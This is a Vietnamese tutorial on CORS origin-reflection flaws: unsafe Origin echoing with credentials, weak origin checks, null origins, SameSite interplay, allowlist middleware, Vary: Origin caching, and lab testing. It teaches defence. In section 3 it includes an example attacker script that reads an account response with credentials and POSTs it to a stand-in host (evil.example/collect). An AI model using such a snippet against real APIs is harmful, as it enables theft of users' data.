# Origin reflection: rủi ro khi phản chiếu Origin trong CORS

## 1. Origin reflection là gì?

Khi trình duyệt gửi request cross-origin, nó thường kèm header `Origin` để server biết request được khởi tạo từ origin nào. Server dùng chính sách Cross-Origin Resource Sharing (CORS) để quyết định origin đó có được phép đọc phản hồi hay không. Một số hệ thống triển khai bằng cách **đọc giá trị `Origin` từ request rồi phản chiếu lại nguyên văn trong response header `Access-Control-Allow-Origin` (ACAO)**.

Kỹ thuật phản chiếu có thể an toàn nếu server chỉ phản chiếu những origin đã được xác minh trong allowlist. Nhưng nếu server phản chiếu **bất kỳ** giá trị Origin nào, nó có thể vô tình cấp quyền đọc dữ liệu cho website của attacker. Rủi ro nghiêm trọng hơn khi response còn có:

```http
Access-Control-Allow-Credentials: true
```

Khi đó, một trang độc hại có thể khiến trình duyệt gửi request với cookie hoặc thông tin xác thực phù hợp, rồi đọc dữ liệu nhạy cảm từ response nếu các điều kiện CORS khác được đáp ứng.

Chủ đề này thuộc phần CORS nâng cao của module bảo mật trình duyệt: cần hiểu ranh giới origin, cookie, SOP, CORS, CSRF và cách kiểm tra header thực tế để tránh biến một cơ chế chia sẻ dữ liệu thành lỗ hổng rò rỉ dữ liệu.

Sau bài học, bạn có thể:

- Nhận diện cấu hình phản chiếu Origin không an toàn.
- Giải thích vì sao ACAO phản chiếu kết hợp credentials có thể cho attacker đọc dữ liệu người dùng.
- Thiết kế allowlist origin chính xác, xử lý `null` và subdomain có rủi ro.
- Cấu hình cache đúng với CORS động bằng `Vary: Origin`.
- Kiểm tra preflight, actual response và hành vi cookie trong trình duyệt.

## 2. CORS kiểm soát điều gì?

Giả sử ứng dụng frontend chạy ở `https://app.example.com` và API ở `https://api.example.net`. Hai địa chỉ khác origin vì host khác nhau. SOP không mặc nhiên cho phép JavaScript của frontend đọc response từ API. CORS cho phép API công bố origin nào được đọc response.

Một response CORS đơn giản có thể chứa:

```http
Access-Control-Allow-Origin: https://app.example.com
```

Trình duyệt so sánh origin được phép với origin của document khởi tạo request. Nếu hợp lệ và các điều kiện khác đạt, JavaScript có thể đọc response.

**CORS là cơ chế kiểm soát việc JavaScript trong trình duyệt đọc phản hồi cross-origin.** Nó không phải xác thực người dùng, không cấp quyền truy cập API ở backend và không ngăn mọi request được gửi. Server vẫn phải xác thực session/token, phân quyền và chống CSRF cho endpoint thay đổi trạng thái.

### 2.1 ACAO không phải danh sách nhiều origin

`Access-Control-Allow-Origin` nhận một giá trị origin cụ thể hoặc `*` trong trường hợp phù hợp. Không trả một danh sách phân tách bằng dấu phẩy như:

```http
Access-Control-Allow-Origin: https://app.example.com, https://admin.example.com
```

Nếu API cần cho nhiều frontend, server thường chọn một origin từ allowlist dựa trên request hiện tại rồi trả đúng một giá trị ACAO. Việc chọn này là điểm cần kiểm soát chặt.

## 3. Cách phản chiếu Origin có thể trở thành lỗ hổng

Một triển khai nguy hiểm thường có logic tương tự:

```javascript
// Pseudocode nguy hiểm: phản chiếu bất kỳ Origin nào.
const origin = request.headers.origin;
response.setHeader("Access-Control-Allow-Origin", origin);
response.setHeader("Access-Control-Allow-Credentials", "true");
```

Nếu attacker mở trang `https://evil.example`, trang đó có thể gọi API nhạy cảm:

```javascript
fetch("https://api.example.com/account", {
  credentials: "include"
})
  .then(response => response.json())
  .then(data => {
    // Nếu CORS cho phép đọc, dữ liệu có thể được gửi ra ngoài.
    fetch("https://evil.example/collect", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify(data)
    });
  });
```

Nếu API phản chiếu `https://evil.example` trong ACAO và trả `Access-Control-Allow-Credentials: true`, trình duyệt có thể cho phép JavaScript của attacker đọc response được tạo trong phiên người dùng. Điều kiện cookie/credentials thực tế vẫn phải thỏa, nhưng cấu hình CORS đã loại bỏ một ranh giới bảo vệ quan trọng.

Luồng khai thác khái quát:

```text
Người dùng đăng nhập api.example.com
          │
          ▼
Mở trang attacker: https://evil.example
          │
          │ fetch(api.example.com/account, credentials: include)
          ▼
Trình duyệt gửi request kèm Origin: https://evil.example
và cookie nếu cookie policy cho phép
          │
          ▼
API phản chiếu Origin:
  ACAO: https://evil.example
  ACAC: true
          │
          ▼
Trình duyệt chấp nhận CORS response
          │
          ▼
JavaScript attacker đọc dữ liệu nhạy cảm
          │
          ▼
Dữ liệu có thể bị gửi tới máy chủ attacker
```

### 3.1 Vì sao credentials làm rủi ro tăng?

Trong Fetch API, `credentials: "include"` yêu cầu trình duyệt cân nhắc gửi credentials phù hợp cho request cross-origin. Với cookie, việc gửi thực tế còn phụ thuộc:

- `Domain` hoặc host-only, `Path` và `Secure`.
- `SameSite` và quan hệ site giữa trang nguồn với API.
- Chính sách cookie bên thứ ba, partitioning và cài đặt riêng của trình duyệt.
- Trạng thái đăng nhập và các chính sách của ứng dụng.

Khi response dùng credentials, server phải trả ACAO là **origin cụ thể**, không được dùng `*`; đồng thời phải trả `Access-Control-Allow-Credentials: true`. Phản chiếu Origin tùy ý có thể thỏa điều kiện này cho cả trang attacker.

### 3.2 Preflight không phải lúc nào cũng bảo vệ API

Request GET không có header ngoài nhóm safelisted có thể không cần preflight. Trình duyệt gửi request trước rồi mới kiểm tra response CORS. Nếu response phản chiếu Origin và cho phép credentials, script có thể đọc dữ liệu.

Với request cần preflight, OPTIONS thường không mang credentials của request thật. Nếu attacker-origin được preflight chấp nhận, trình duyệt có thể gửi request thật; response thật cũng cần CORS header phù hợp để JavaScript đọc được. Vì vậy, chỉ cấu hình OPTIONS mà bỏ qua actual response hoặc ngược lại đều có thể tạo hành vi không mong muốn.

## 4. Những kiểu kiểm tra Origin sai thường gặp

Không phải mọi lỗi đều là phản chiếu nguyên văn. Nhiều hệ thống cố giới hạn origin bằng cách so sánh chuỗi nhưng cách kiểm tra thiếu chặt chẽ.

| Kiểu kiểm tra | Ví dụ | Rủi ro |
| --- | --- | --- |
| Phản chiếu mọi origin | Gán ACAO bằng `req.headers.origin` mà không kiểm tra. | Mọi website có thể được cấp quyền đọc nếu các header CORS khác cũng cho phép. |
| Kiểm tra chuỗi con | `origin.includes("example.com")` | Chấp nhận `https://example.com.attacker.test`. |
| Hậu tố không có ranh giới | `origin.endsWith("example.com")` | Có thể chấp nhận `https://evil-example.com`. |
| Cho phép mọi subdomain | Chấp nhận mọi host kết thúc bằng `.example.com`. | Có thể tin nhầm subdomain do bên thứ ba quản lý, subdomain takeover hoặc ứng dụng cũ. |
| Cho phép `null` | Cho ACAO phản chiếu chuỗi `"null"`. | Nhiều opaque origin không liên quan có cùng serialization `null`. |
| Bỏ qua scheme/port | Chỉ so hostname. | Có thể cho phép HTTP hoặc port không thuộc môi trường tin cậy. |
| Dùng regex quá rộng | Regex không neo đầu/cuối hoặc không kiểm tra ranh giới host. | Có thể khớp URL ngoài dự kiến. |

### 4.1 Origin gồm scheme, host và port

Ví dụ origin:

```text
https://app.example.com:8443
└https┘ └app.example.com┘ └8443┘
scheme         host          port
```

Những origin sau khác nhau:

- `https://app.example.com` và `http://app.example.com`: khác scheme.
- `https://app.example.com` và `https://app.example.com:8443`: khác port.
- `https://app.example.com` và `https://admin.example.com`: khác host.

Không nên chỉ so hostname nếu ứng dụng chỉ tin một origin HTTPS cụ thể. Cũng không nên tự tách chuỗi URL bằng regex đơn giản; dùng parser URL chuẩn, sau đó đối chiếu origin đã chuẩn hóa với allowlist.

### 4.2 Subdomain không mặc nhiên đáng tin

Một ứng dụng có thể cho phép `https://*.example.com` vì có nhiều frontend dưới các subdomain. Điều này chỉ hợp lý khi tổ chức kiểm soát vòng đời và bảo mật **tất cả** subdomain được phép.

Nếu `old-app.example.com` đã bỏ sử dụng nhưng DNS còn trỏ tới dịch vụ bên thứ ba, hoặc một subdomain có XSS, attacker có thể chiếm một origin mà CORS đang tin tưởng. Từ đó, dù không phản chiếu mọi origin, allowlist wildcard vẫn có thể tạo đường đọc dữ liệu.

Ưu tiên allowlist chính xác từng origin. Nếu thực sự cần cho phép subdomain động, hãy kiểm tra ranh giới domain bằng parser, scheme/port, quyền sở hữu subdomain và cơ chế thu hồi; đừng coi điều kiện hậu tố đơn giản là đủ.

## 5. Origin: null và các tài liệu có opaque origin

Một số document không có origin tuple thông thường. Ví dụ:

- Trang từ URL `data:` thường có opaque origin.
- `iframe sandbox` thiếu `allow-same-origin` có thể có opaque origin.
- Một số ngữ cảnh `file:` hoặc tài liệu đặc biệt có thể được biểu diễn bằng origin `null`.

Khi serialize trong header hoặc sự kiện, opaque origin thường được biểu diễn là chuỗi `null`. Điều này **không có nghĩa mọi tài liệu mang `null` đều cùng một origin hoặc cùng mức tin cậy**.

Không dùng cấu hình:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

như một cách cho phép chung nội dung thử nghiệm hoặc tài liệu nhúng. Attacker có thể tạo ngữ cảnh opaque origin trong những tình huống phù hợp rồi lợi dụng chính sách quá rộng. Nếu một ứng dụng có yêu cầu hợp lệ liên quan tới opaque origin, phải thiết kế riêng kênh dữ liệu và xác minh mô hình tin cậy; không dùng `null` làm danh tính duy nhất.

## 6. Same-site, SameSite cookie và origin reflection

Site và origin là hai khái niệm khác nhau. `https://app.example.com` và `https://evil.example.com` có thể **same-site nhưng cross-origin**. Nếu attacker kiểm soát một subdomain, trang đó có thể tạo request đến API trên subdomain khác trong ngữ cảnh same-site.

Ví dụ cookie:

```http
Set-Cookie: session=opaque-value; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Lax
```

Cookie này có thể áp dụng cho các subdomain phù hợp. Khi trang ở `evil.example.com` gọi API ở `api.example.com`, hai host khác origin nhưng cùng site theo mô hình schemeful same-site. Cookie SameSite=Lax có thể được gửi trong request same-site phù hợp; thuộc tính `HttpOnly` ngăn JavaScript đọc cookie nhưng không ngăn trình duyệt tự gửi cookie.

Điều này làm cho cấu hình CORS phản chiếu Origin đặc biệt nguy hiểm khi tổ chức có subdomain ít được kiểm soát. Một attacker kiểm soát subdomain có thể:

1. Tạo trang script chạy tại origin phụ.
2. Gọi API nội bộ cùng site với `credentials: "include"`.
3. Nhận cookie phiên do trình duyệt tự đính kèm nếu cookie scope cho phép.
4. Đọc response nếu API phản chiếu origin phụ và cho phép credentials.

**SameSite không thay thế CORS allowlist.** Tương tự, CORS không thay thế CSRF token hay kiểm tra quyền backend. Hãy dùng cookie host-only khi phù hợp, giới hạn Domain, đặt `Secure`/`HttpOnly`/`SameSite` theo nhu cầu và kiểm soát từng origin được tin cậy.

## 7. Cấu hình CORS an toàn bằng allowlist

Thay vì phản chiếu tùy ý, server nên có danh sách origin chính xác:

```javascript
const allowedOrigins = new Set([
  "https://app.example.com",
  "https://admin.example.com"
]);

function applyCors(req, res) {
  const origin = req.headers.origin;

  if (origin && allowedOrigins.has(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");
    res.setHeader("Access-Control-Allow-Credentials", "true");
  }
}
```

Đây là ví dụ khái niệm. Hệ thống thực tế cần quyết định endpoint nào cần credentials; không bật `Access-Control-Allow-Credentials` toàn cục nếu không cần. Nếu origin không nằm trong allowlist, không trả ACAO cho origin đó. Có thể từ chối request tùy nghiệp vụ, nhưng nhớ rằng thiếu ACAO chủ yếu khiến trình duyệt không cho JavaScript đọc response; nó không đảm bảo request chưa được gửi.

### 7.1 Dùng URL parser khi cần chuẩn hóa

Nếu server nhận một giá trị Origin, cần xác định chính sách so sánh. Origin header hợp lệ thường là serialization của origin, không phải URL đầy đủ có path. Có thể dùng URL parser để xác minh cú pháp và chuẩn hóa, sau đó so sánh origin:

```javascript
const allowedOrigins = new Set([
  "https://app.example.com",
  "https://admin.example.com"
]);

function isAllowedOrigin(value) {
  if (typeof value !== "string" || value === "null") return false;

  try {
    const parsed = new URL(value);
    // Origin header phải đại diện một origin, không phải URL có path.
    if (parsed.origin !== value) return false;
    return allowedOrigins.has(parsed.origin);
  } catch {
    return false;
  }
}
```

Parser giúp tránh một số lỗi xử lý cú pháp, nhưng **không thay allowlist**. Nếu cần hỗ trợ origin có dạng IDN, cần thống nhất cách canonicalize hostname giữa lúc cấu hình và lúc so sánh. Không chấp nhận wildcard chỉ vì parser có thể đọc URL.

### 7.2 Middleware minh họa

Ví dụ dưới đây mô tả cách xử lý origin, preflight và request thật theo một chính sách tối thiểu. Đây là pseudocode theo phong cách Express, cần điều chỉnh cho framework và route thực tế:

```javascript
const allowedOrigins = new Set([
  "https://app.example.com",
  "https://admin.example.com"
]);
const allowedMethods = new Set(["GET", "POST", "PUT"]);
const allowedHeaders = new Set([
  "authorization",
  "content-type",
  "x-request-id"
]);

function corsPolicy(req, res, next) {
  const origin = req.get("Origin");
  const allowed = typeof origin === "string" &&
                  allowedOrigins.has(origin);

  // Vary cả response được chọn theo Origin để cache không trộn origin.
  res.vary("Origin");

  if (!allowed) {
    // Không phản chiếu Origin lạ. Request thật vẫn phải qua authz/CSRF.
    if (req.method === "OPTIONS" &&
        req.get("Access-Control-Request-Method")) {
      return res.sendStatus(403);
    }
    return next();
  }

  res.set("Access-Control-Allow-Origin", origin);
  res.set("Access-Control-Allow-Credentials", "true");

  if (req.method !== "OPTIONS" ||
      !req.get("Access-Control-Request-Method")) {
    return next();
  }

  const requestedMethod =
    req.get("Access-Control-Request-Method").toUpperCase();
  const requestedHeaders = (req.get(
    "Access-Control-Request-Headers"
  ) || "")
    .split(",")
    .map(name => name.trim().toLowerCase())
    .filter(Boolean);

  if (!allowedMethods.has(requestedMethod)) return res.sendStatus(405);
  if (!requestedHeaders.every(name => allowedHeaders.has(name))) {
    return res.sendStatus(403);
  }

  res.set("Access-Control-Allow-Methods", "GET, POST, PUT");
  res.set(
    "Access-Control-Allow-Headers",
    "Authorization, Content-Type, X-Request-ID"
  );
  res.set("Access-Control-Max-Age", "600");
  return res.sendStatus(204);
}
```

Điểm quan trọng:

- Chỉ phản chiếu origin sau khi so sánh chính xác với allowlist.
- OPTIONS không yêu cầu cookie/session của request thật; preflight được quyết định theo origin, method và request headers.
- Request thật vẫn cần xác thực, phân quyền và CSRF protection.
- Response thật, kể cả response lỗi mà frontend cần đọc, phải đi qua chính sách CORS tương ứng.
- Nếu endpoint không cần cookie/HTTP credentials, bỏ `Access-Control-Allow-Credentials` và cân nhắc dùng chế độ credentials phù hợp.

## 8. Vary: Origin và rủi ro cache

Khi server chọn ACAO động theo header `Origin`, response có thể khác nhau giữa hai request:

```http
Request A:
Origin: https://app.example.com

Response A:
Access-Control-Allow-Origin: https://app.example.com

Request B:
Origin: https://admin.example.com

Response B:
Access-Control-Allow-Origin: https://admin.example.com
```

Nếu CDN hoặc HTTP cache lưu response A nhưng phục vụ lại cho request B mà không phân biệt Origin, có thể xảy ra:

- Header CORS không khớp, làm request hợp lệ bị lỗi.
- Response có thể bị chia sẻ sai ngữ cảnh, đặc biệt đáng lo nếu cache nhầm nội dung cá nhân hóa.

Với response được chọn theo Origin, gửi:

```http
Vary: Origin
```

Header này hướng dẫn cache xem `Origin` là một yếu tố của cache key. Nó **không tự biến response nhạy cảm thành an toàn để cache công khai**. Với dữ liệu theo người dùng/session, cần chính sách cache riêng như `Cache-Control: private` hoặc `no-store` tùy yêu cầu.

Preflight response có thể phụ thuộc thêm `Access-Control-Request-Method` và `Access-Control-Request-Headers`. Nếu tầng cache HTTP dùng chung lưu OPTIONS, cần xem xét các header này trong `Vary`. CORS-preflight cache của trình duyệt là một cache riêng; không đồng nhất nó với CDN cache.

## 9. Cách kiểm thử origin reflection

Thực hiện trong môi trường lab và chỉ với API do bạn kiểm soát. Chuẩn bị:

- Frontend hợp lệ: `https://app.example.com` hoặc một frontend localhost.
- Origin không được phép: `https://attacker.invalid`.
- API có endpoint trả dữ liệu thử nghiệm, không chứa dữ liệu thật.

### 9.1 Kiểm tra response header

Gửi request từ trình duyệt tới API và mở **DevTools → Network → request → Headers**. Kiểm tra:

1. Request có header `Origin` nào?
2. Response có `Access-Control-Allow-Origin` không?
3. ACAO là origin chính xác hay wildcard?
4. Có `Access-Control-Allow-Credentials: true` không?
5. Nếu origin động, có `Vary: Origin` không?
6. Response thực tế có cùng chính sách với OPTIONS không?

Không chỉ nhìn request OPTIONS. Với request đơn giản, preflight có thể không xuất hiện; actual response vẫn phải được kiểm tra.

### 9.2 Dùng curl để kiểm tra logic server

curl không thực thi SOP/CORS như trình duyệt, nhưng hữu ích để xem server phản hồi ra sao với một header Origin giả lập:

```bash
curl -i https://api.example.com/account \
  -H "Origin: https://attacker.invalid"
```

Thử thêm origin hợp lệ:

```bash
curl -i https://api.example.com/account \
  -H "Origin: https://app.example.com"
```

Kết quả mong đợi:

- Origin hợp lệ được cấp ACAO chính xác theo chính sách.
- Origin không được phép không được phản chiếu.
- Nếu endpoint yêu cầu credentials, ACAC chỉ được cấp cho origin hợp lệ.
- Response cá nhân hóa không được cache công khai.

curl cho phép tự đặt header Origin nên **không chứng minh một browser có thể đọc response**. Muốn xác minh khai thác CORS, cần thử từ một document thật trên origin khác trong trình duyệt.

### 9.3 Thử nghiệm browser an toàn

Trong lab, tạo một trang ở origin attacker do bạn quản lý:

```javascript
fetch("https://api.example.com/test-profile", {
  credentials: "include"
})
  .then(response => response.text())
  .then(text => {
    document.querySelector("#result").textContent = text;
  })
  .catch(error => {
    document.querySelector("#result").textContent =
      "Browser không cho đọc response: " + error;
  });
```

Endpoint chỉ trả một chuỗi giả lập, không chứa dữ liệu cá nhân. Khi API phản chiếu origin tùy ý và bật credentials, browser có thể cho trang attacker đọc response nếu cookie phù hợp được gửi. Sau đó sửa server để chỉ cho phép origin hợp lệ và chạy lại; browser không còn cho origin attacker đọc response.

Không thử trên tài khoản hoặc API của người khác. Nếu đang kiểm tra hệ thống thật, dùng tài khoản thử nghiệm và dữ liệu giả đã được phê duyệt.

## 10. Checklist rà soát Origin reflection

| Hạng mục | Câu hỏi cần trả lời |
| --- | --- |
| Nguồn Origin | Server có đọc header Origin không? Có đường code nào phản chiếu trực tiếp không? |
| Allowlist | Danh sách origin được tin cậy có chính xác scheme/host/port không? |
| Credentials | Endpoint có thật sự cần `Access-Control-Allow-Credentials: true` không? |
| Cookie | Cookie có Domain quá rộng, SameSite không phù hợp hoặc thiếu Secure/HttpOnly không? |
| Subdomain | Có subdomain cũ, do đối tác quản lý hoặc có nguy cơ takeover/XSS nằm trong allowlist không? |
| Opaque origin | Server có chấp nhận `null` mà không có mô hình tin cậy rõ ràng không? |
| Preflight | OPTIONS có giới hạn method/header đúng không? Có vô tình cho phép origin tùy ý không? |
| Actual response | Response thành công và lỗi có ACAO/ACAC nhất quán không? |
| Cache | Dynamic ACAO có `Vary: Origin`? Response cá nhân hóa có cache policy phù hợp? |
| Backend security | API có xác thực, phân quyền và CSRF protection độc lập với CORS không? |
| Logging | Có log origin bị từ chối và thay đổi chính sách CORS để phát hiện cấu hình bất thường không? |

## 11. Câu hỏi tự kiểm tra

1. Vì sao `Access-Control-Allow-Origin` phản chiếu tùy ý nguy hiểm hơn khi đi kèm `Access-Control-Allow-Credentials: true`?
2. Một request GET đơn giản có cần preflight trước khi browser gửi không? Nếu response CORS không hợp lệ, server có thể đã xử lý request chưa?
3. Vì sao `Origin: null` không phải danh tính an toàn để đưa vào allowlist?
4. Hai subdomain cùng site nhưng khác origin có thể tạo rủi ro gì nếu cookie có `Domain=example.com` và API phản chiếu origin?
5. Vì sao kiểm tra `origin.endsWith("example.com")` không đủ chặt?
6. `Vary: Origin` giải quyết vấn đề gì? Nó có thay thế `Cache-Control: private` hay `no-store` không?
7. curl gửi header Origin và nhận response thành công có chứng minh browser cho phép JavaScript đọc response không?
8. CORS có thay thế CSRF token, xác thực hoặc phân quyền backend không?

## 12. Tổng kết

**Origin reflection** chỉ an toàn khi server phản chiếu lại một origin đã được xác minh trong allowlist. Nếu server echo bất kỳ Origin nào và đồng thời cho phép credentials, website attacker có thể khiến trình duyệt gửi request với thông tin xác thực phù hợp rồi đọc response nhạy cảm. Những lỗi kiểm tra chuỗi, tin mọi subdomain hoặc chấp nhận `null` đều có thể mở rộng ranh giới tin cậy ngoài dự kiến.

Hãy dùng allowlist chính xác theo scheme, host và port; chỉ bật credentials khi cần; không tin Origin như danh tính người dùng; đặt `Vary: Origin` cho response được chọn động; kiểm soát cookie, subdomain và cache; đồng thời giữ xác thực, phân quyền và chống CSRF ở backend. Cuối cùng, kiểm chứng cả OPTIONS lẫn actual response bằng trình duyệt, vì CORS là chính sách do browser thực thi chứ không phải một lớp bảo vệ API độc lập.
